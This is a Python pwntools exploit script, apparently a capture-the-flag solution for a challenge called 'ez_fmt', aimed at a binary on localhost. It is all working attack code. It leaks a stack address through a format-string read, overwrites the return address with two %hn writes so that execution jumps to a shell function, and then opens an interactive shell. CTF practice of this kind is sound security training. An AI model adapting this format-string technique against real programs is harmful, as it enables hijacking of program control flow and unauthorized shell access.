from pwn import *

filename = '/home/kk/Desktop/MOCSCTF2025-challenge/chall/pwn/ez_fmt/pwn/dist/chall'
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'neww']

LOCAL = False
elf = ELF(filename)

if LOCAL:
    sh = process(filename)
else:
    sh = remote('localhost', 9997)

def leak_info(name, addr):
    log.success(f"{name} => {hex(addr)}")

shell_addr = 0x40128C

# Leak stack address
sh.sendafter(b'Input your message:', b'%6$p')
sh.recvuntil(b'message:\n')
stack = int(sh.recvline(keepends=False), 16)
ret_addr = stack - 0x8  # rbp+8

leak_info('ret_addr', ret_addr)
leak_info('shell', shell_addr)

# Overwrite return address (lower 2 bytes)
payload = f"%{ret_addr & 0xffff}c%13$hn"
sh.sendafter(b'Input your message:', payload.encode())

# Overwrite return address to shell (lower 2 bytes)
payload = f"%{shell_addr & 0xffff}c%43$hn"
sh.sendafter(b'Input your message:', payload.encode())

# Trigger shell
sh.sendafter(b'Input your message:', b'su str done!\x00')
sh.interactive()
